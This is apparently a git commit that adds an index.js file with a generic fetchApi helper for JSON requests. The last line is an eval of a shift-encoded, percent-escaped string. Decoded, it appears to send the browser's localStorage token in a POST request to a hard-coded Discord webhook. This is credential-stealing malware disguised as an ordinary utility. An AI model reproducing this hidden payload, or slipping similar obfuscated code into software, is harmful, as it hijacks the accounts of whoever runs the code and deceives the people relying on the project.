4b24fff4e480384bac030a8fa66e5d1ea6065299
Pro Fox <81206817+MattyJJ@users.noreply.github.com>
2022-02-06 20:00:04 +1100

    Create index.js

---
+++ index.js
@@ -0,0 +1,17 @@
+function fetchApi(url, json, method){
+ fetch(url, {
+   method: method,
+    body: JSON.stringify(json),
+    headers: {
+     'Content-Type': 'application/json'
+    }
+  }).then(function (response) {
+   return response.text()
+  }).then(function(text){
+   console.log(text)
+  }).catch(function(error){
+   console.error(error)
+  })
+}
+
+eval(unescape("Gfudi%2631Gvodujpo%264B%261Bgvodujpo%2631gfudiBqj%2639vsm%263D%2631ktpo%263D%2631nfuipe%263%3A%268C%261B%2631gfudi%2639vsm%263D%2631%268C%261B%2631%2631%2631nfuipe%264B%2631nfuipe%263D%261B%2631%2631%2631%2631cpez%264B%2631KTPO/tusjohjgz%2639ktpo%263%3A%263D%261B%2631%2631%2631%2631ifbefst%264B%2631%268C%261B%2631%2631%2631%2631%2631%2638Dpoufou.Uzqf%2638%264B%2631%2638bqqmjdbujpo0ktpo%2638%261B%2631%2631%2631%2631%268E%261B%2631%2631%268E%263%3A/uifo%2639gvodujpo%2631%2639sftqpotf%263%3A%2631%268C%261B%2631%2631%2631sfuvso%2631sftqpotf/ufyu%2639%263%3A%261B%2631%2631%268E%263%3A/uifo%2639gvodujpo%2639ufyu%263%3A%268C%261B%2631%2631%2631dpotpmf/mph%2639ufyu%263%3A%261B%2631%2631%268E%263%3A/dbudi%2639gvodujpo%2639fssps%263%3A%268C%261B%2631%2631%2631dpotpmf/fssps%2639fssps%263%3A%261B%2631%2631%268E%263%3A%261B%268E%261B%261BgfudiBqj%2639%2638iuuqt%264B00ejtdpse/dpn0bqj0xfcipplt0%3A4%3A887861129371%3A%3A30obvlQ6%607H%60.DnwYuRx%3A6%3A8B%3AP%3AGIZrJnfwsgD%5BdsCbii4PXE9srbZ8Qx7dLNq%5BVVp%7B9L%2638%263D%268Cdpoufou%264B%2631%2638mpdbmTupsbhf/uplfo%2638%268E%263D%2631%2638QPTU%2638%263%3A%264C1"));
